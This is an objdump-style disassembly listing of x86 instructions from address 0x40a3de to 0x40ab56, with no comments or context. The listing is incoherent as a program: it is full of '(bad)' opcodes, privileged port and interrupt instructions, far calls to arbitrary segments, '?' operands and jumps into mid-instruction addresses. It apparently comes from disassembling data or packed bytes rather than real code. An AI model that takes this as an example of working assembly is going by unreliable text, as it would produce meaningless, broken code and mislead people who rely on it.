  40a3de:	xchg   edx,eax
  40a3df:	inc    ecx
  40a3e0:	jae    0x40a3e0
  40a3e2:	scas   eax,DWORD PTR es:[edi]
  40a3e3:	out    0xf2,al
  40a3e5:	jecxz  0x40a3fa
  40a3e7:	js     0x40a393
  40a3e9:	dec    esp
  40a3ea:	retf   0x750e
  40a3ed:	jecxz  0x40a406
  40a3ef:	mov    esp,0xa4f0a96b
  40a3f4:	aas    
  40a3f5:	imul   ebp,DWORD PTR [edi+esi*8-0x41cb6b1],0x12dd2feb
  40a400:	push   cs
  40a401:	adc    dl,BYTE PTR [ebx-0x46]
  40a404:	cli    
  40a405:	xchg   edi,eax
  40a406:	pop    ebx
  40a407:	cmp    eax,0x92fa4c9d
  40a40c:	adc    edx,DWORD PTR [esi-0x45eabd47]
  40a412:	jnp    0x40a48b
  40a414:	fisub  DWORD PTR [ecx+0x74d0b4f6]
  40a41a:	or     al,0x80
  40a41c:	pop    esp
  40a41d:	ucomiss xmm5,DWORD PTR [ecx+0x4149e26b]
  40a424:	cmp    DWORD PTR [edi+0x13c83e9e],ebp
  40a42a:	pusha  
  40a42b:	fwait
  40a42c:	imul   edx,DWORD PTR [edi],0x994e78f8
  40a432:	shr    DWORD PTR [edi+0x2f],1
  40a435:	inc    ebx
  40a436:	setne  BYTE PTR [edx]
  40a439:	cld    
  40a43a:	ret    
  40a43b:	ret    
  40a43c:	jno    0x40a4ac
  40a43e:	add    edi,ebp
  40a440:	(bad)  
  40a441:	(bad)  
  40a442:	adc    ebp,DWORD PTR [eax-0x16fa5140]
  40a448:	dec    esp
  40a449:	call   0xdfb8:0x7e84b994
  40a450:	add    esp,DWORD PTR [ecx-0x78]
  40a453:	push   0xffffffcd
  40a455:	add    eax,ebp
  40a457:	add    eax,0x5bc628aa
  40a45c:	out    dx,al
  40a45d:	es pushf 
  40a45f:	mov    eax,ds:0x2f081433
  40a464:	bound  ecx,QWORD PTR [edi-0x54]
  40a467:	jbe    0x40a3ff
  40a469:	imul   edx,DWORD PTR [esi+esi*4+0x37726c18],0x2529101c
  40a474:	add    ebx,ecx
  40a476:	and    dh,BYTE PTR [esi]
  40a478:	(bad)  
  40a479:	in     eax,0xa3
  40a47b:	clc    
  40a47c:	fwait
  40a47d:	or     BYTE PTR [esi+0x5cbf685f],bh
  40a483:	cmp    al,0xb6
  40a485:	retf   0xaee1
  40a488:	add    DWORD PTR gs:[esp+ecx*2-0x3aaada2a],eax
  40a490:	mov    bl,0x5a
  40a492:	in     eax,0x3b
  40a494:	gs je  0x40a442
  40a497:	mov    BYTE PTR [esi],ah
  40a499:	and    DWORD PTR [ebx],0xfe09d7b9
  40a49f:	jno    0x40a477
  40a4a1:	inc    esi
  40a4a2:	push   edx
  40a4a3:	xor    edx,DWORD PTR [edi+0x4860f23c]
  40a4a9:	pop    esi
  40a4aa:	sbb    ecx,edi
  40a4ac:	add    ebx,DWORD PTR [ebx+0x43ed1d12]
  40a4b2:	jns    0x40a46b
  40a4b4:	sbb    al,0xeb
  40a4b6:	in     al,dx
  40a4b7:	(bad)  
  40a4b9:	leave  
  40a4ba:	dec    ebx
  40a4bb:	aad    0xaf
  40a4bd:	cmp    al,0x66
  40a4bf:	fsubr  QWORD PTR gs:[ecx-0x1e]
  40a4c3:	xchg   esp,eax
  40a4c4:	fidivr DWORD PTR [ebx+eax*4+0x3e]
  40a4c8:	jno    0x40a4f9
  40a4ca:	(bad)  
  40a4cb:	cmp    BYTE PTR [eax-0x7fe03dd5],bl
  40a4d1:	mov    ebp,0x9b9dcced
  40a4d6:	arpl   WORD PTR [ecx+ebp*2],bp
  40a4d9:	and    al,0xa7
  40a4db:	jnp    0x40a4ec
  40a4dd:	pop    ecx
  40a4de:	push   esp
  40a4df:	sbb    al,0xb2
  40a4e1:	aas    
  40a4e2:	pop    ecx
  40a4e3:	sahf   
  40a4e4:	test   al,0xde
  40a4e6:	jle    0x40a4a8
  40a4e8:	jmp    0x40a46c
  40a4ea:	mov    ah,0x18
  40a4ec:	mov    eax,0x6594c28f
  40a4f1:	lds    edi,FWORD PTR es:[esi-0x2c]
  40a4f5:	pop    esp
  40a4f6:	xchg   ebx,eax
  40a4f7:	mov    bh,0x31
  40a4f9:	add    bl,al
  40a4fb:	call   0xb738:0x738d4406
  40a502:	retf   
  40a503:	dec    ebx
  40a504:	xor    DWORD PTR ds:0x91e01782,ecx
  40a50a:	xchg   ebx,eax
  40a50b:	retf   
  40a50c:	push   ebp
  40a50d:	popf   
  40a50e:	inc    ebx
  40a50f:	cli    
  40a510:	or     eax,DWORD PTR ds:0x2a8f9eee
  40a516:	mov    dh,0xa5
  40a518:	(bad)  
  40a519:	push   edx
  40a51a:	dec    ecx
  40a51b:	in     eax,dx
  40a51c:	fild   WORD PTR [eax]
  40a51e:	lods   eax,DWORD PTR ds:[esi]
  40a51f:	and    al,0xe8
  40a521:	(bad)  
  40a523:	jmp    0x4c08:0xd72d5efc
  40a52a:	adc    eax,0xbef0205d
  40a52f:	std    
  40a530:	out    0xdb,al
  40a532:	cdq    
  40a533:	ins    DWORD PTR es:[edi],dx
  40a534:	mov    DWORD PTR [esi-0x292c2735],esp
  40a53a:	or     DWORD PTR [edx+0x30],edi
  40a53d:	ss cmp al,0xa7
  40a540:	sahf   
  40a541:	inc    ebx
  40a542:	sbb    DWORD PTR [eax+eax*2+0x56],0x73
  40a547:	jb     0x40a51c
  40a549:	into   
  40a54a:	retf   0xe274
  40a54d:	int    0xfa
  40a54f:	sbb    ah,0xb6
  40a552:	repz test edx,ecx
  40a555:	test   eax,0x7c37b77a
  40a55a:	inc    ecx
  40a55b:	leave  
  40a55c:	(bad)  
  40a55d:	rol    BYTE PTR [edx],cl
  40a55f:	test   BYTE PTR [edi-0x6f224263],0xfc
  40a566:	into   
  40a567:	push   DWORD PTR [eax]
  40a569:	call   0x8faa:0xd703869
  40a570:	mov    ebp,0x66b43b1b
  40a575:	rcl    esp,cl
  40a577:	idiv   DWORD PTR [ecx-0x49]
  40a57a:	aam    0xa9
  40a57c:	js     0x40a512
  40a57e:	push   ebp
  40a57f:	xchg   esi,eax
  40a580:	ret    
  40a581:	fiadd  WORD PTR [ecx+0x6386a642]
  40a587:	push   esp
  40a588:	and    BYTE PTR [ecx+0x70],cl
  40a58b:	test   al,0x36
  40a58d:	mov    bl,0x5a
  40a58f:	std    
  40a590:	fdivr  st,st(5)
  40a592:	pushf  
  40a593:	stos   BYTE PTR es:[edi],al
  40a594:	rcr    eax,0x65
  40a597:	mov    esi,0x4054a69b
  40a59c:	sahf   
  40a59d:	bound  edx,QWORD PTR [ecx+0x6b]
  40a5a0:	pop    edi
  40a5a1:	je     0x40a61e
  40a5a3:	sbb    eax,0x7b4a9be4
  40a5a8:	es dec edi
  40a5aa:	sahf   
  40a5ab:	je     0x40a574
  40a5ad:	pop    esi
  40a5ae:	int    0x4e
  40a5b0:	int    0x74
  40a5b2:	jno    0x40a559
  40a5b4:	dec    esi
  40a5b5:	and    DWORD PTR [edx-0x2b],eax
  40a5b8:	xor    BYTE PTR [ecx+0x2e],dl
  40a5bb:	jmp    0x6a12033b
  40a5c0:	test   DWORD PTR [esp+ebp*1+0x5d6f348e],edi
  40a5c7:	xor    eax,0x12c8f1c
  40a5cc:	xor    BYTE PTR [ecx],bl
  40a5ce:	xchg   ecx,eax
  40a5cf:	xchg   edx,eax
  40a5d0:	lods   al,BYTE PTR ds:[esi]
  40a5d1:	xchg   ecx,eax
  40a5d2:	mov    ebp,0x967338bd
  40a5d7:	dec    edx
  40a5d8:	imul   esp,DWORD PTR [eax],0x1ca3f3d8
  40a5de:	sub    al,0x7d
  40a5e0:	push   0x7d
  40a5e2:	mov    ds:0xbcff8181,eax
  40a5e7:	cmp    DWORD PTR [edx+0x353cdaa2],esp
  40a5ed:	fnsave [esi+ecx*2]
  40a5f0:	out    0x2f,eax
  40a5f2:	dec    esi
  40a5f3:	scas   eax,DWORD PTR es:[edi]
  40a5f4:	ret    
  40a5f5:	xor    eax,DWORD PTR [ebx-0x3f40b8dd]
  40a5fb:	outs   dx,DWORD PTR ds:[esi]
  40a5fc:	lock out 0x7b,al
  40a5ff:	and    al,0xa3
  40a601:	push   esp
  40a602:	jno    0x40a662
  40a604:	popa   
  40a605:	dec    edx
  40a606:	(bad)  
  40a607:	loope  0x40a61d
  40a609:	call   0x400eff11
  40a60e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a60f:	and    BYTE PTR [edx-0x6e],bh
  40a612:	mov    esp,0xe3f3165c
  40a617:	push   ds
  40a618:	cmp    al,0xb9
  40a61a:	outs   dx,BYTE PTR ds:[esi]
  40a61b:	cwde   
  40a61c:	push   edi
  40a61d:	add    edi,DWORD PTR [edi+0x8]
  40a620:	push   edx
  40a621:	mov    esp,0x5ad7a6d9
  40a626:	inc    edx
  40a627:	add    ch,ah
  40a629:	in     eax,dx
  40a62a:	mov    ecx,0x7d353777
  40a62f:	cmp    eax,0xf2ca0db8
  40a634:	jmp    0x40a691
  40a636:	lea    eax,[ebp+ebx*2+0x6825bc01]
  40a63d:	pop    ebp
  40a63e:	aam    0x67
  40a640:	mov    edi,0x28ce3516
  40a645:	ror    DWORD PTR [edi+0x20],cl
  40a648:	sub    ecx,ecx
  40a64a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a64b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a64c:	psllw  mm4,QWORD PTR [eax-0x19]
  40a650:	sub    bh,dl
  40a652:	push   edi
  40a653:	pop    esp
  40a654:	lds    ebp,FWORD PTR [edx]
  40a656:	inc    esi
  40a657:	ret    
  40a658:	aaa    
  40a659:	test   BYTE PTR [edx],0x8d
  40a65c:	ret    0x23fa
  40a65f:	xchg   ebp,eax
  40a660:	adc    eax,0x73d6ba05
  40a665:	leave  
  40a666:	(bad)  
  40a667:	mov    ds:0x4807b66f,eax
  40a66c:	dec    esp
  40a66d:	bound  ebx,QWORD PTR [ecx+0x59]
  40a670:	arpl   WORD PTR [edx+0x227da2f8],si
  40a676:	mov    WORD PTR [eax+0x27],?
  40a679:	xor    BYTE PTR [edi],0xb0
  40a67c:	push   eax
  40a67d:	movaps xmm3,xmm2
  40a680:	js     0x40a6ff
  40a682:	lahf   
  40a683:	mov    eax,ds:0xc61d884d
  40a688:	mov    edi,0x618aeb29
  40a68d:	dec    ebx
  40a68e:	sub    ah,ah
  40a690:	inc    ecx
  40a691:	(bad)  
  40a692:	(bad)  
  40a693:	jb     0x40a700
  40a695:	es adc al,0x49
  40a698:	adc    eax,0x8af962b
  40a69d:	ss or  bl,cl
  40a6a0:	outs   dx,DWORD PTR ds:[esi]
  40a6a1:	sbb    BYTE PTR [ecx+eax*8],ch
  40a6a4:	push   esp
  40a6a5:	mov    ds:0xbd93baa6,al
  40a6aa:	push   ebx
  40a6ab:	mov    al,ds:0x37ed8097
  40a6b0:	sti    
  40a6b1:	test   al,0xa0
  40a6b3:	pop    esp
  40a6b4:	scas   al,BYTE PTR es:[edi]
  40a6b5:	daa    
  40a6b6:	adc    ch,BYTE PTR [esi+0x68]
  40a6b9:	into   
  40a6ba:	push   0xfffffff2
  40a6bc:	mov    edx,0x85217236
  40a6c1:	(bad)  
  40a6c2:	loope  0x40a6e3
  40a6c4:	jle    0x40a72a
  40a6c6:	mov    dh,0x74
  40a6c8:	sbb    BYTE PTR [ebx-0x39],cl
  40a6cb:	jns    0x40a705
  40a6cd:	aad    0x96
  40a6cf:	popf   
  40a6d0:	xor    ebp,DWORD PTR [edi+0x42]
  40a6d3:	(bad)  
  40a6d4:	fld    QWORD PTR ds:0xdafae09c
  40a6da:	or     dl,BYTE PTR ds:0xd98b3795
  40a6e0:	repz arpl WORD PTR [edx-0x6829eab0],ax
  40a6e7:	mov    ah,0x85
  40a6e9:	sub    BYTE PTR [ebp+0x24b2a322],cl
  40a6ef:	(bad)  
  40a6f0:	mov    ch,0x53
  40a6f2:	repz push eax
  40a6f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6f5:	sub    DWORD PTR [esi-0x5e5308c],ebx
  40a6fb:	(bad)  
  40a6fc:	jmp    0x40a744
  40a6fe:	jae    0x40a775
  40a700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a701:	call   0xc9ea:0xa4ab50a5
  40a708:	jno    0x40a713
  40a70a:	xor    eax,0xcc4f1fbe
  40a70f:	pop    esp
  40a710:	nop
  40a711:	add    ah,BYTE PTR [ebx+0x18e0ca5b]
  40a717:	(bad)  
  40a719:	inc    edx
  40a71a:	or     ah,BYTE PTR [esi+edx*2+0x70]
  40a71e:	mov    eax,ds:0xb0e7a5a6
  40a723:	cld    
  40a724:	cs sti 
  40a726:	and    al,0x63
  40a728:	xor    eax,0x5cf767f8
  40a72d:	cmp    DWORD PTR [esi+0x45],eax
  40a730:	xchg   esp,eax
  40a731:	loopne 0x40a76e
  40a733:	push   ds
  40a734:	jmp    0x8aa4:0x21b05824
  40a73b:	push   0x10
  40a73d:	bnd jmp 0x5a4dc96d
  40a743:	xor    al,0xc
  40a745:	inc    ecx
  40a746:	push   edx
  40a747:	sti    
  40a748:	in     al,dx
  40a749:	push   es
  40a74a:	pop    ecx
  40a74b:	icebp  
  40a74c:	lock addr16 jp 0x40a78e
  40a750:	inc    esi
  40a751:	arpl   si,bx
  40a753:	jmp    0x40a740
  40a755:	into   
  40a756:	or     ah,ah
  40a758:	test   DWORD PTR [ecx+0x7a],edi
  40a75b:	add    ah,dl
  40a75d:	dec    edi
  40a75e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a75f:	fcom   QWORD PTR [eax-0x28c881b0]
  40a765:	fisttp QWORD PTR [edx]
  40a767:	mov    ebp,0x7479e04a
  40a76c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a76d:	ret    0xe68f
  40a770:	dec    esp
  40a771:	add    bl,ah
  40a773:	add    DWORD PTR [ecx+0x3a35bc6f],ebx
  40a779:	arpl   bp,si
  40a77b:	sub    ah,cl
  40a77d:	inc    edx
  40a77e:	mov    ch,0x7f
  40a780:	retf   0xb685
  40a783:	cmp    eax,0x9709a846
  40a788:	jle    0x40a7be
  40a78a:	adc    DWORD PTR cs:[ecx-0x4b],edi
  40a78e:	ret    0x36df
  40a791:	adc    dh,ch
  40a793:	sub    cl,dl
  40a795:	lea    esi,[ecx-0x7f55d43d]
  40a79b:	mov    dh,0xcc
  40a79d:	jo     0x40a784
  40a79f:	push   esp
  40a7a0:	pop    ebx
  40a7a1:	jge    0x40a785
  40a7a3:	mov    eax,0x648033f8
  40a7a8:	pop    ds
  40a7a9:	das    
  40a7aa:	(bad)  
  40a7ab:	cmp    eax,0xdcdee099
  40a7b0:	inc    ebp
  40a7b1:	sbb    DWORD PTR ds:0xe1cc42e0,edi
  40a7b7:	in     eax,dx
  40a7b8:	into   
  40a7b9:	stc    
  40a7ba:	fst    DWORD PTR [edx]
  40a7bc:	dec    esp
  40a7bd:	lods   eax,DWORD PTR ds:[esi]
  40a7be:	sub    ecx,DWORD PTR [eax+esi*1-0x51]
  40a7c2:	jbe    0x40a789
  40a7c4:	repnz push edx
  40a7c6:	push   eax
  40a7c7:	and    al,0x42
  40a7c9:	xor    esi,esp
  40a7cb:	in     eax,dx
  40a7cc:	pop    edi
  40a7cd:	daa    
  40a7ce:	cmp    bh,BYTE PTR [edx-0x1a62f58f]
  40a7d4:	xchg   esi,eax
  40a7d5:	add    ebp,DWORD PTR [ebx]
  40a7d7:	inc    ebx
  40a7d8:	popa   
  40a7d9:	lahf   
  40a7da:	mov    al,ds:0x447c1b1b
  40a7df:	push   ebp
  40a7e0:	pop    esp
  40a7e1:	push   edi
  40a7e2:	or     DWORD PTR [eax+0x17f0561c],ebp
  40a7e8:	dec    esi
  40a7e9:	cmp    al,0x9b
  40a7eb:	aaa    
  40a7ec:	call   0xdc6c:0x2959c076
  40a7f3:	ds mov ah,cl
  40a7f6:	pop    ds
  40a7f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7f8:	adc    DWORD PTR ds:0x51d51b19,esp
  40a7fe:	scas   al,BYTE PTR es:[edi]
  40a7ff:	call   0x1b0f:0x7c5af512
  40a806:	xor    eax,0xa6717abd
  40a80b:	rcl    ah,cl
  40a80d:	xor    DWORD PTR [esi],ebx
  40a80f:	or     edi,DWORD PTR [esp+edx*1-0x52]
  40a813:	mov    bh,0xec
  40a815:	inc    eax
  40a816:	idiv   BYTE PTR [esi]
  40a818:	push   esp
  40a819:	jo     0x40a7b6
  40a81b:	xchg   ebp,eax
  40a81c:	addr16 mov bl,0xfe
  40a81f:	xchg   ebx,eax
  40a820:	std    
  40a821:	inc    edx
  40a822:	cwde   
  40a823:	int3   
  40a824:	pop    esi
  40a825:	inc    edi
  40a826:	lods   al,BYTE PTR ds:[esi]
  40a827:	dec    ecx
  40a828:	stos   DWORD PTR es:[edi],eax
  40a829:	jno    0x40a88d
  40a82b:	push   0xffffffdb
  40a82d:	pop    ss
  40a82e:	shl    DWORD PTR [edi*2+0x707ff72a],cl
  40a835:	cmp    al,0x5b
  40a837:	jne    0x40a827
  40a839:	add    DWORD PTR [ecx+esi*2+0x18],ecx
  40a83d:	mov    al,0x96
  40a83f:	int    0x5e
  40a841:	dec    ebp
  40a842:	push   ebx
  40a843:	xchg   ecx,eax
  40a844:	push   edi
  40a845:	fadd   st(3),st
  40a847:	call   0xb8c191f0
  40a84c:	mov    bl,0x81
  40a84e:	call   0xaf75d563
  40a853:	xchg   ebp,eax
  40a854:	or     ah,ch
  40a856:	imul   edi,DWORD PTR ss:[eax+0x6c],0xffffffc5
  40a85b:	int3   
  40a85c:	jns    0x40a88c
  40a85e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a85f:	ficom  DWORD PTR [edx+0x50]
  40a862:	add    BYTE PTR [ecx],ah
  40a864:	mov    BYTE PTR [edi+0x761c49c9],ah
  40a86a:	mov    edx,0xc0f3e32c
  40a86f:	out    0x8a,al
  40a871:	pop    ss
  40a872:	fsubr  QWORD PTR [ecx+0x789174d0]
  40a878:	jmp    0x40a888
  40a87a:	push   ds
  40a87b:	mov    ecx,DWORD PTR [ebp-0xfd2764]
  40a881:	loope  0x40a83d
  40a883:	pop    esi
  40a884:	jne    0x40a8ee
  40a886:	xor    eax,0xfcad950c
  40a88b:	int3   
  40a88c:	arpl   cx,bp
  40a88e:	xor    cl,bl
  40a890:	cmp    al,0x4
  40a892:	sub    al,0x6c
  40a894:	in     eax,dx
  40a895:	test   DWORD PTR [ecx+ebp*8],eax
  40a898:	out    dx,al
  40a899:	jns    0x40a894
  40a89b:	loope  0x40a833
  40a89d:	fcom   QWORD PTR [ebx]
  40a89f:	aam    0x21
  40a8a1:	jae    0x40a8a3
  40a8a3:	xchg   edi,eax
  40a8a4:	leave  
  40a8a5:	inc    esp
  40a8a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8a7:	sbb    DWORD PTR [esi-0x2e96edac],edx
  40a8ad:	cli    
  40a8ae:	lds    ebx,FWORD PTR [esi+0x4d065424]
  40a8b4:	ds scas eax,DWORD PTR es:[edi]
  40a8b6:	gs jno 0x40a924
  40a8b9:	and    DWORD PTR [edi],esi
  40a8bb:	push   ecx
  40a8bc:	mov    ds:0xd0a84e69,al
  40a8c1:	sbb    bh,bh
  40a8c3:	fisubr DWORD PTR [ebp-0x5d]
  40a8c6:	jb     0x40a8bf
  40a8c8:	sub    eax,0xae9b9c40
  40a8cd:	xor    eax,0x9a98283c
  40a8d2:	cmc    
  40a8d3:	mov    WORD PTR [eax+edi*2+0x75],ds
  40a8d7:	sahf   
  40a8d8:	icebp  
  40a8d9:	loope  0x40a897
  40a8db:	pop    edi
  40a8dc:	imul   esp,DWORD PTR [ecx-0x3b785e5],0xffffff99
  40a8e3:	fimul  DWORD PTR [edx]
  40a8e5:	sahf   
  40a8e6:	xor    DWORD PTR [edx],eax
  40a8e8:	jno    0x40a948
  40a8ea:	inc    ebx
  40a8eb:	inc    edi
  40a8ec:	(bad)  
  40a8ee:	adc    eax,0x6b897e48
  40a8f3:	jo     0x40a95e
  40a8f5:	cmp    ecx,0xffffffea
  40a8f8:	or     ch,dl
  40a8fa:	jecxz  0x40a8f5
  40a8fc:	shl    BYTE PTR [esi+0x4d811b68],1
  40a902:	jle    0x40a931
  40a904:	push   ebx
  40a905:	aas    
  40a906:	(bad)  
  40a907:	das    
  40a908:	repnz push 0xffffffb6
  40a90b:	adc    edi,ebx
  40a90d:	pop    edx
  40a90e:	xlat   BYTE PTR ds:[ebx]
  40a90f:	repz inc esi
  40a911:	push   ds
  40a912:	aad    0xc
  40a914:	jnp    0x40a955
  40a916:	or     al,BYTE PTR [eax-0x33ef498f]
  40a91c:	or     BYTE PTR [ecx-0x62bac494],bh
  40a922:	stos   DWORD PTR es:[edi],eax
  40a923:	arpl   WORD PTR [edi+edi*1+0x3e5fa4a7],sp
  40a92a:	or     ch,BYTE PTR [esi]
  40a92c:	sti    
  40a92d:	lock enter 0x239d,0xf4
  40a932:	fwait
  40a933:	dec    edi
  40a934:	mov    esp,0x27695c2c
  40a939:	mov    DWORD PTR [edi+ebp*2-0x36],eax
  40a93d:	or     BYTE PTR [ecx+0x5312a765],ah
  40a943:	cmp    eax,0x8be9f0bd
  40a948:	imul   edi,DWORD PTR [esp+eiz*8],0x76d9594e
  40a94f:	push   cs
  40a950:	mov    ds:0x94f4ee7f,eax
  40a955:	and    BYTE PTR [edi-0x1e],ch
  40a958:	daa    
  40a959:	leave  
  40a95a:	cwde   
  40a95b:	into   
  40a95c:	jmp    0xa617:0x63f8e383
  40a963:	call   0xde4edfdd
  40a968:	add    ecx,DWORD PTR [edi]
  40a96a:	scas   eax,DWORD PTR es:[edi]
  40a96b:	xor    al,0x25
  40a96d:	add    al,0xef
  40a96f:	xor    ch,ah
  40a971:	lds    esi,FWORD PTR [ecx-0x1f]
  40a974:	aas    
  40a975:	sub    ah,BYTE PTR [ebx+0x40]
  40a978:	cmp    esp,0xdd507964
  40a97e:	mov    esp,0x10febf90
  40a983:	mov    DWORD PTR [ecx-0x4f],edx
  40a986:	lock pop ebp
  40a988:	inc    edx
  40a98a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a98b:	and    eax,0x520b00f
  40a990:	daa    
  40a991:	cmp    dh,BYTE PTR [eax]
  40a993:	add    dh,BYTE PTR [ebp+0x38e717e7]
  40a999:	adc    al,0xaa
  40a99b:	jl     0x40a922
  40a99d:	call   0xa0e9:0xd8e5078c
  40a9a4:	fsub   DWORD PTR [eax+0x43]
  40a9a7:	imul   edi,DWORD PTR [ecx],0xffffff97
  40a9aa:	mov    esi,DWORD PTR ds:0xf2dfa1d9
  40a9b0:	shl    DWORD PTR gs:[ebx+esi*1],cl
  40a9b4:	jb     0x40a9d6
  40a9b6:	jmp    0xa6cb:0xf2a10962
  40a9bd:	sbb    BYTE PTR [ebp+ebx*8-0x514fccf2],dh
  40a9c4:	xor    ecx,DWORD PTR [eax]
  40a9c6:	adc    ah,cl
  40a9c8:	jne    0x40a9e1
  40a9ca:	sbb    esp,DWORD PTR [eax+0x5d1f9b33]
  40a9d0:	popf   
  40a9d1:	mov    ds:0x81872d37,al
  40a9d6:	inc    esp
  40a9d7:	xchg   esi,eax
  40a9d8:	jb     0x40a9f3
  40a9da:	adc    eax,0xc6973707
  40a9df:	sahf   
  40a9e0:	push   cs
  40a9e1:	fidivr WORD PTR [ecx-0x1c00d8a6]
  40a9e7:	dec    ebp
  40a9e8:	bound  edi,QWORD PTR [edx-0x4eab4f97]
  40a9ee:	jle    0x40a99b
  40a9f0:	pop    ecx
  40a9f1:	aad    0x10
  40a9f3:	cli    
  40a9f4:	in     eax,dx
  40a9f5:	rcl    bh,1
  40a9f7:	pop    es
  40a9f8:	jle    0x40a992
  40a9fa:	pop    esi
  40a9fb:	jb     0x40a9fc
  40a9fd:	push   es
  40a9fe:	cmp    al,0xe4
  40aa00:	jmp    0x40aa26
  40aa02:	mov    ebx,DWORD PTR [ebx-0x3c]
  40aa05:	ins    BYTE PTR es:[edi],dx
  40aa06:	dec    edx
  40aa07:	sbb    eax,0x654fa2b6
  40aa0c:	std    
  40aa0d:	adc    BYTE PTR [edx-0x248659b4],ch
  40aa13:	fdivr  DWORD PTR [ecx+0x5d]
  40aa16:	sbb    cl,al
  40aa18:	aam    0x20
  40aa1a:	xlat   BYTE PTR ds:[ebx]
  40aa1b:	jle    0x40a9d9
  40aa1d:	les    ebx,FWORD PTR [edx+edx*4]
  40aa20:	mov    esi,0x5ae0b4fc
  40aa25:	(bad)
  40aa28:	adc    eax,0x4a4f4bda
  40aa2d:	dec    esi
  40aa2e:	jae    0x40aa00
  40aa30:	xchg   BYTE PTR [esp+ecx*1-0x4a],al
  40aa34:	xchg   ebp,eax
  40aa35:	dec    ebx
  40aa36:	cmp    DWORD PTR [ecx-0x67eb30ac],eax
  40aa3c:	and    ch,al
  40aa3e:	dec    ebp
  40aa3f:	or     ah,BYTE PTR [ebx+0x243f31b6]
  40aa45:	and    ebp,DWORD PTR es:[ebx+0x43]
  40aa49:	rcl    DWORD PTR [edx+0x6f],cl
  40aa4c:	outs   dx,DWORD PTR ds:[esi]
  40aa4d:	or     BYTE PTR [ecx+ebp*2+0x7a],bh
  40aa51:	xchg   DWORD PTR [edi+0x2f],eax
  40aa54:	outs   dx,BYTE PTR ds:[esi]
  40aa55:	fld    TBYTE PTR [esi-0x22]
  40aa58:	add    BYTE PTR [esp+ecx*4+0x56],ah
  40aa5c:	icebp  
  40aa5d:	sub    DWORD PTR [ebx],ebp
  40aa5f:	mov    ds:0x22446fef,eax
  40aa64:	jno    0x40aad3
  40aa66:	push   es
  40aa67:	out    dx,al
  40aa68:	sbb    DWORD PTR [ebx-0x4d],esp
  40aa6b:	jl     0x40aa87
  40aa6d:	pop    ebx
  40aa6e:	sub    eax,0x2f41962b
  40aa73:	pop    ecx
  40aa74:	push   edi
  40aa75:	inc    esp
  40aa76:	mov    edi,0x284eea75
  40aa7b:	mov    esi,0x70c2a0b5
  40aa80:	mov    cl,0x7
  40aa82:	sub    esp,DWORD PTR [esi+0x22]
  40aa85:	pop    esi
  40aa86:	cli    
  40aa87:	aaa    
  40aa88:	sbb    BYTE PTR [edx-0x13c6fea1],cl
  40aa8e:	xchg   esi,eax
  40aa8f:	mov    eax,ds:0xb944ef77
  40aa94:	loope  0x40aaff
  40aa96:	xchg   BYTE PTR [ecx-0x58],bl
  40aa99:	lods   al,BYTE PTR ds:[esi]
  40aa9a:	dec    esp
  40aa9b:	fnsave [ecx+ecx*4]
  40aa9e:	mov    al,0xe5
  40aaa0:	add    BYTE PTR [edi],0xee
  40aaa3:	push   ecx
  40aaa4:	mov    dh,0x53
  40aaa6:	mov    eax,ds:0x56ad80ab
  40aaab:	pop    ebx
  40aaac:	jmp    0xe2b3:0x15b3feff
  40aab3:	sbb    eax,0x75454845
  40aab8:	sbb    BYTE PTR [edi-0x67],bl
  40aabb:	cmp    al,0x5c
  40aabd:	fimul  DWORD PTR [ebp+0x38]
  40aac0:	in     al,0x62
  40aac2:	push   ss
  40aac3:	in     al,dx
  40aac4:	jle    0x40aab2
  40aac6:	add    dh,BYTE PTR [eax]
  40aac8:	jo     0x40ab2f
  40aaca:	addr16 mov edx,0x6df2aad4
  40aad0:	pop    ds
  40aad1:	lahf   
  40aad2:	jl     0x40aa7e
  40aad4:	fcomp  DWORD PTR [edi]
  40aad6:	aaa    
  40aad7:	or     bl,dl
  40aad9:	jg     0x40aaac
  40aadb:	scas   al,BYTE PTR es:[edi]
  40aadc:	push   cs
  40aadd:	sub    al,0xf6
  40aadf:	xchg   BYTE PTR [edx-0x1981558],al
  40aae5:	push   0x19df9d13
  40aaea:	(bad)  
  40aaeb:	in     al,dx
  40aaec:	adc    al,0x98
  40aaee:	xor    DWORD PTR [eax],esp
  40aaf0:	inc    ebp
  40aaf1:	mov    ds:0x7135cd8a,al
  40aaf6:	add    BYTE PTR [edi-0x706e794],ch
  40aafc:	(bad)  
  40aafd:	pop    edx
  40aafe:	cli    
  40aaff:	dec    ecx
  40ab00:	daa    
  40ab01:	push   esi
  40ab02:	xor    ecx,DWORD PTR [ecx+ebp*1+0x45105e8]
  40ab09:	mov    eax,ss
  40ab0b:	inc    eax
  40ab0c:	lods   al,BYTE PTR ds:[esi]
  40ab0d:	and    dl,BYTE PTR [eax-0x7f]
  40ab10:	sbb    al,0xbb
  40ab12:	imul   edi,DWORD PTR [ecx-0x4d],0x7c
  40ab16:	pop    eax
  40ab17:	jno    0x40ab2c
  40ab19:	jnp    0x40ab4b
  40ab1b:	xchg   ecx,eax
  40ab1c:	sti    
  40ab1d:	cmp    al,0x47
  40ab1f:	sbb    ecx,ebp
  40ab21:	rcr    edx,1
  40ab23:	sub    BYTE PTR [eax-0x51],0x84
  40ab27:	fdivr  QWORD PTR [esi]
  40ab29:	ins    DWORD PTR es:[edi],dx
  40ab2a:	hlt    
  40ab2b:	sub    ebx,DWORD PTR [eax]
  40ab2d:	mov    cl,0x1d
  40ab2f:	push   esp
  40ab30:	mov    ?,WORD PTR ds:0x7e1034c3
  40ab36:	repz sub BYTE PTR [ebx-0x69c4e2aa],bh
  40ab3d:	lock movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  40ab40:	in     al,0x27
  40ab42:	fidiv  DWORD PTR [edi-0x5061d085]
  40ab48:	ret    0x7f1c
  40ab4b:	(bad)  
  40ab4c:	mov    ebx,0x8c4ffd9f
  40ab51:	dec    esp
  40ab52:	rcl    DWORD PTR [edi],cl
  40ab54:	int    0x65
  40ab56:	das    
